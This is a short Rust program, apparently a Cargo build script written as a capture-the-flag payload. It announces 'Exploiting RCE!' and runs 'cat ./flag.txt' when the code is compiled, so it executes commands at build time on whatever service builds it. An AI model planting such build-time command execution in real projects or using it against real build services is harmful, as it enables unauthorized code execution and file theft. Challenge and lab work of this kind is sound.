fn main() {
    println!("cargo:warning=Exploiting RCE!");
    std::process::Command::new("cat")
        .arg("./flag.txt")
        .status()
        .unwrap();
}
